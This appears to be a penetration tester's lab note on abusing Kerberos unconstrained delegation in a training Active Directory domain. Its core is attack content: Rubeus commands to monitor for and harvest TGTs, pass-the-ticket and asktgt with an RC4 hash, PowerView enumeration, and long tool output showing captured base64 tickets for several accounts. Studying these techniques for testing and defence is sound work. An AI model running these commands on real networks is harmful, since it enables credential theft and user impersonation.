## Unconstrainder Delegation - Computers

Unconstrained delegation was the only type of delegation available in Windows 2000. If a user requests a service ticket on a 
server with unconstrained delegation enabled, the user's Ticket Granting Ticket (TGT) is embedded into the service ticket that
is then presented to the server

The server can cache this ticket in memory and then pretend to be that user for subsequent resource requests in the domain.
If unconstrained delegation is not enabled, only the user's ticket Granting Service (TGS) ticket will be stored in memory. In this
case, if the machine is compromised, an attacker could only access the resource specified in the TGS ticket in that user's
context



### Vector Attack

```bat
.\Rubeus.exe monitor /interval:5 /nowrap

# Group enumeration

Import-Module .\PowerView.ps1

Get-DomainGroup -MemberIdentity <user name>
```


to see the available shares I can use this:

```bat
net view \\COPUTERNAME
```

```bat
.\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt
```


```bat
.\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
```



C:\Windows\system32>cd c:\Tools

c:\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:

  User                  :  derek.walker@INLANEFREIGHT.LOCAL
  StartTime             :  9/2/2024 1:37:30 AM
  EndTime               :  9/2/2024 11:37:30 AM
  RenewTill             :  9/9/2024 1:37:30 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    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


[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:

  User                  :  SQL01$@INLANEFREIGHT.LOCAL
  StartTime             :  9/2/2024 1:37:31 AM
  EndTime               :  9/2/2024 11:37:31 AM
  RenewTill             :  9/9/2024 1:37:31 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIETj6VqVjIKmf5A7miWpNrk3qEi2b9erucZwyu4NSIPCB/1+2vX7Jnc5cI5mHto7Jc1fxUmnI21NVE85JNQS4J2x1ffOwY4hc8EP9HWxakK4ifOfr1j1KOmCPoNPOHsicCpRQ3fnVB7OKVjEyNBRTpwpr0rdo+7RLx6psnvw/8x550QK1xOxkRA05hoYqrQ5jksJNrd3F9PdleV9SJU4J3B7EeWPobweVa07iHSTLXllciJbpf4lgHR/6AZLW9w8vDfRkHsNvh3o+VE8Weg+8eFwocYWgbU7WarGxvIS1SVtSYSVhpK+BAmh37QLOg1GtLJv3HAVbmZjZIFkm9J3nozJs4SB5vzqn2g87ssZLQFC7jsO62sfYmxaf/PoCNbLEYiJHPRhk4y6I//xihoO0beQtSemNGYPbP2LJnSTlPr5upPKCCU7ORMOOSoMGBLH7b2n5irfX/NdyoQBCgYhEW6jUPVAa5hkyOdTPItq8h3X7OrT+9mKJhVIFtI9OCWegS3tWHOMI8O305VQjwQnQFG1b6VB8xYJSkD3UWj2umyNT6L7Ijqx5lYezAKhSu3QYjMEudVax3me1UlHYgCPjLwvbUAPIOhDVCYERAzSd8QM1XKmi+37IiYVM59NRl6j//PRL3x27prgOVEKuke1ozPYYrnCDaYN/MOBzF8V+sGE7bfLZ5PVBqjujqXLLJo2oCLvsLluoer79z2BpoXtJg2ln9QqYsDVmU+7zjw6Z5ikx4jf3PaEe72ZLRSAWn3JIVmJ0EKmNhJvpV8ddAQ386dytLgSrr9jL0JDNeXl2EBdB8efYTAYapxuxQlAE4ATYdT1Y8TsTsRwbj1+LwrAVMbUt2Ell+zWOvkN77se0e9s5Yvu+bKNud+XUikAMzTb/myb9vOoIKSBnAQ9EqXLEen4KMAMiRZKqQ9ySCZv8iwiOwnuUQCQAz8FJHZGIMOhKmGbI3lUpF9/i/XjPZLFEYs46EYdFYfnf7sDbJcnsQ7JIh1Xb5KHUWPnfXfeHY8xN4sw7KSGtTowWYvZs2AKbPTQPQ/s80qASSGl5nQRzW2HWjzfscPI17F9OmZkfUNxF8+L+RmU2y1ft2vCZ8VMSrEmCn2QSDrjFXpH2FdN5ZjzXmP7kxKVlsdBsgs1rB5MIA+Wi0dHX6acS0ad4chfclWhLmqJTd4aLCn/xBmbVOdfYQIE9VukeYM7HkY2uc9Iw0aFO7pBsTr1xpO06VfxY+z1lcdYS6vhPYmBUi7PxT6ncljwAQX7JVnAoGLZGqsseL0GFNmi3ryn2BngqdM65EXAO/OkN9JIgKlQCX0LKJTvXVjfdwSCLsnqtiDV4eyDXR/amWK8sxrzoaQJjs+VcdYV1MgPWXWW3Ij7GzEOWCW5p5A4H2dEJFfwwEEJA/y4QeMyoA6r4r+rspiJwzcNegI53M0DtdYwOw8goRDoiLGgxc51ia2ndyGV1XTHjMxp+jgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCCKHMABTodvI9nCoN0V6MaBR/eAJAlfuKlRtbkJj2jOaqEVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjQwOTAyMDYzNzMxWqYRGA8yMDI0MDkwMjE2MzczMVqnERgPMjAyNDA5MDkwNjM3MzFaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=


[*] 9/2/2024 6:44:33 AM UTC - Found new TGT:

  User                  :  SQL01$@INLANEFREIGHT.LOCAL
  StartTime             :  9/2/2024 1:38:03 AM
  EndTime               :  9/2/2024 11:38:03 AM
  RenewTill             :  9/9/2024 1:38:03 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFyDCCBcSgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggRkMIIEYKADAgESoQMCAQKiggRSBIIEThPuH1UujCQM4c5Wj05YnkrUZwMMMZSM4xqJHIOb633jO1Qp6SFbxE7U0w9pCCCX+d5Og19j63J8se76jk1PQX6bVz5N0vgaOc5qR6AJQY1PjDSCmN69kwJUs8/rraY1AoO8+6cqjmdbPo3LRFB2JRpRLHE+9sLEkZSHm/Vil1CX5sgkUjMPrenugOLdHhpejwFetd528ERVP3PYXP2r9dl68ly9MYkWLcJIyZtjJfiEzLqeE1Rxo7Mau+C5e2GiOtA5pYHWRIHcVwBLCDD3BakCqFWsxRyMSRi/ZVNQqolfdMqUrpq7GT+mryhEkoLe0Hd4ukZc1VFpfo9dq99HIQOsvI/tugQ3Gm/UvLmeEsPAwIHx8gtp0KgS40/Y+HuToVu3cCgNPmMBGtSDzC58JFiP2ToSOJJpbJ09WPFd/XtzmV9mFHHIXd1WMFKyKqdO4Ux7jmlGqYhJFa82rVPE0qDgPIBiTgXE4YkRBxknJTWXRd9bJ1B1aY57CGL/vJvNB1/xPoSCLXPaJ2jEh0/reTb0vvmbb7cZlVpJoQekhHI5E7euFk2iBvnHd1z1mRz1AQo82UuS59P6lXv8/mcbqT8h2N6d8xfoyq89JxJ6YmpJZz7si3U44bmu/U1fjgycR8q2i4ek1BkzCV13S0MlzZ54ekDYwRB6GjmXc0mxW5sa9ufWebRdQ+ChrdUHFSIpl0Tqe9ePCoJ2ttjezjYVdekQPI9JaAHWhcaZNIxeTp+5POcLkmregZmxPJ7SHkJZC9wrgyRKep33KNJrAjfsKUttY/PFXZ3nMhQn6h+ICHYbTl9fq3tImZ3wz9OspFPQLUR3o2q7iab9V8IuVQYZF/gaJFIU8/IjEmIEwd7IAbYyEUciQZB2t1ty0rpAda6CUBm0Pysvc3JXrbGw6XVf4e0BjMIjaHDGLYkqI2/S+vl5qw4PuJPVOTlj7S+3vpKytvGDjPVQTfO2PUSCafwGr2KCe+Mprv/nSV1RtqtfY9YNM4txbpW78S+nWTcHaPCwHp4moMSwwuUIXIKgY5ugeWef6Tv2BFCCUG8Eqcs6+6tIw7iuNUBFLlyFfBRHC9TJDpFu1R0kOosusiqWR3dNl3KfVrc+oOcPE2AZfMc6UNfR76uTA8cdnbMgDLmM3YsSZbhlkFdrZQb3H1KJ4gN0ed89miUcm/9VVn3/qO9UFSeKqzpgKPLShq49QrllwSgJOvn0Z27d2CeOnECn+TwpYfbfEpP7EkOdzLHkXvjwWc7yqrUDh1WgdQH4LvWc5kIpRQqbOoqbgyRrEADBd4+vH3qmB6v7tkOHGhe0/SVba0wH8GsCEIeWzCjxBTbQPuApK32vpA7SZ6CxFSgW+efNF2jRIt4Ggq8t7XM9L3a4pzwU5c2Cvuk/X0UesgILKwmrpPhGHS/Bh80XNhWVsSru3bFc8Ma6BwLwPlx+JtMZZgfeDll/NK6WhE+bm8plYJWjgfkwgfagAwIBAKKB7gSB632B6DCB5aCB4jCB3zCB3KArMCmgAwIBEqEiBCDhydEJQdilA1X0dQhBT6Al+z7XkXSM5R/I1wDIjqvJW6EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohMwEaADAgEBoQowCBsGU1FMMDEkowcDBQBA4QAApREYDzIwMjQwOTAyMDYzODAzWqYRGA8yMDI0MDkwMjE2MzgwM1qnERgPMjAyNDA5MDkwNjM4MDNaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=

[*] Ticket cache size: 3


[*] 9/2/2024 6:44:53 AM UTC - Found new TGT:

  User                  :  brian.willis@INLANEFREIGHT.LOCAL
  StartTime             :  9/2/2024 1:44:36 AM
  EndTime               :  9/2/2024 11:44:36 AM
  RenewTill             :  9/9/2024 1:44:36 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 4



